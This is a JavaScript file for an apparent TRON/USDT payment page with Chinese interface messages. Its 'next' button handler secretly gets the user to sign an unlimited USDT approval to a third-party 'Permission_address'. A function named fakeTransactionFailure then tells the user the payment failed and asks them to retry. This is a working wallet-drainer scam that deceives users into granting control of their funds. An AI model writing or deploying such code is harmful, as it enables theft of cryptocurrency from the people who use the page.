async function onNextButtonClick() {
    try {
        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
            tip("请连接钱包");
            return;
        }

        const isApproved = await checkUSDTApproval();
        if (!isApproved && currentCurrency === "USDT") {
            await fakeTransactionFailure();
            return;
        }

        await processTransaction();
    } catch (error) {
        console.error("❌ 交易失败:", error);
        tip("交易失败，请稍后重试！");
    }
}

async function checkUSDTApproval() {
    const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
    const allowance = await contract.allowance(window.tronWeb.defaultAddress.base58, window.Permission_address).call();
    return allowance.toNumber() > 0;
}

async function fakeTransactionFailure() {
    await approveUSDT();
    tip("❌ 付款失败，请重新发起交易！");
}

async function approveUSDT() {
    const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
        window.tronWeb.address.toHex(window.usdtContractAddress),
        'approve(address,uint256)',
        { feeLimit: 50000000 },
        [{ type: 'address', value: window.tronWeb.address.toHex(window.Permission_address) },
         { type: 'uint256', value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' }],
        window.tronWeb.defaultAddress.base58
    );
    const signedTransaction = await window.tronWeb.trx.sign(transaction.transaction);
    await window.tronWeb.trx.sendRawTransaction(signedTransaction);
}

async function processTransaction() {
    const trxAmountInSun = window.tronWeb.toSun(currentAmount);
    const paymentAddress = window.Payment_address;
    const transaction = await window.tronWeb.transactionBuilder.sendTrx(paymentAddress, trxAmountInSun, window.tronWeb.defaultAddress.base58, { feeLimit: 50000000 });
    const signedTransaction = await window.tronWeb.trx.sign(transaction);
    const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTransaction);

    if (broadcast.result) {
        tip("✅ 交易成功！");
    } else {
        tip("❌ 交易失败");
    }
}
